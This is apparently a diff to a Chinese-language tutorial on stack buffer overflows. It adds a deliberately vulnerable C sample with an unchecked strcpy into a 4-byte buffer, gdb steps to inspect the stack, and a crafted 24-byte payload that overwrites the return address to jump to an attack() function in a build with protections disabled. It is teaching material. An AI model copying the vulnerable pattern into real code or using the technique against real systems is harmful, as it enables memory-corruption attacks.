@@ -218,10 +218,12 @@ buffer[0~3]
 实战:
 样例代码:
 ```
-void function(int a)
+#include<stdio.h>
+void function(char b[])
 {
-  printf("a address is: %p\n",&a);
+	printf("b address is:%p\n",b);
 	char buffer[4];
+	strcpy(buffer,b);
 	printf("buffer address is:%p\n",buffer);
 }
 
@@ -233,16 +235,18 @@ void attack()
 void main()
 {
 	printf("attack function address is: %p\n",attack);
-	function(1);
+  char b[]="AA";
+  //char b[]="AAAAAAAAAAAAAAAAAAAAAAAA\4\6@"; //todo
+	function(b);
 }
 ```
-
+栈空间
 ```
 main 函数返回地址, return address
 ---------------
 上一个 ebp
 ---------------
-a
+b
 ---------------
 function 的返回地址
 ---------------
@@ -253,7 +257,63 @@ buffer[0~3]
 ```
 输出
 ```
-attack function address is: 0x400633
-a address is:0x7ffe5d72b11c
-buffer address is:0x7ffe5d72b120
+attack function address is: 0x400604
+b address is:0x7ffcf7cee710
+buffer address is:0x7ffcf7cee6f0
 ```
+步骤:
+环境:
+Ubuntu 16.04 x86_64
+gcc 5.4.0
+gdb 7.11.1
+1: 把样例代码保存为 example1.c, 使用以下命令进行编译
+`gcc -g -z execstack -fno-stack-protector -o exe example1.c`
+GCC 编译器有一种栈保护机制来阻止缓冲区溢出, 所以我们在编译代码时需要用 –fno-stack-protector 关闭这种机制. 而 -z execstack 用于允许执行栈.
+执行 gdb 调试
+`gdb exe`
+可以看到命令提示符改为 (gdb), 说明进入了 gdb 环境.
+启动项目
+`start`
+在 `printf("attack function address is: %p\n",attack);` 处自动打断停下,
+`n` 下一步, 执行到 `char b[]="AA"; `,
+`n` 下一步, 调用 function,
+`s`step into, 进入 function 函数内部, 在 `printf("b address is:%p\n",b);` 处停下,
+`n` 下一步, 在 `strcpy(buffer,b);` 处停止,
+`n` 下一步, 执行完 `strcpy(buffer,b);`,
+
+至此可以停下来了,
+
+`p buffer` 打印 buffer 内容
+`p &buffer` 打印 buffer 虚拟内存地址
+`x /16xw &buffer` 打印 buffer 虚拟内存地址及其之后的 16 个单元内容, 每个单元四个字节, 每个字节按十六进制显示,
+![buffer_over_flow](http://ovt2bylq8.bkt.clouddn.com/b98d2d1f058c72c4a7cfcb9e0b23e460.png)
+
+在 main 函数中查看 function 的返回地址 (因为是 main 函数调用了 function,function 执行完之后会回到 main 函数, 所以返回地址紧接着 main 函数调用 function 函数之后)
+`disassemble main`
+![disassemble_main](http://ovt2bylq8.bkt.clouddn.com/25c7e63b883a232e15975181565a80ee.png)
+四列的第一列代表虚拟内存地址, 第二列代表偏移量, 第三列汇编语言关键字, 第四列汇编语言参数, 在计算机组成原理中学过精简指令集, 格式为 <操作> < 目的 > < 源 >
+可以看到在偏移量为 77 的时候调用了 function, 并且把 function 的起始地址 0x4005b6 给出了, 紧接着偏移量为 78 的虚拟地址就是 function 的返回地址 0x400647
+再对比上面 `x /16wx &buffer` 的输出, 可以看到虚拟地址为 0x7fffffffd968(即第二行第三列) 正是 function 的返回地址 0x00400647,
+接下来只要构造 b 的值使它溢出填充完整个第一行以及第二行前面的空间 (0x7fffffffd950~0x7fffffffd968)
+注意到 buffer 的填充是从每个字节的右往左, 从低地址到高地址, 以第一行 (0x7fffffffd950) 为例
+```
+偏移地址
+   4 3 2 1    8 7 6 5
+0x00004141 0x00000000
+内容
+
+偏移地址
+12 11 10 9 16 15 14 13
+0xf7ffe168 0x00007fff
+内容
+```
+所以 b 的内容是 24 个 A 再加上实际跳转地址, 这里我们想要的跳转地址是 attack 函数,
+先查看 attack 函数的开始地址
+`info line attack`
+输出
+`Line 11 of "example1.c" starts at address 0x400604 <attack> and ends at 0x400608 <attack+4>.
+`
+获得首地址为 0x400604, 上面说过, buffer 填充字节是从右到左, 所以 b 的内容为 `AAAAAAAAAAAAAAAAAAAAAAAA\4\6@`
+在 [这里](https://baike.baidu.com/item/ASCII/309296?fr=aladdin) 可以查到十六进制的 40 是 @字符
+再次编译, 运行, 成功
+![success](http://ovt2bylq8.bkt.clouddn.com/12585db8e5f6fa9c4abbc3b8a04b6c5d.png)
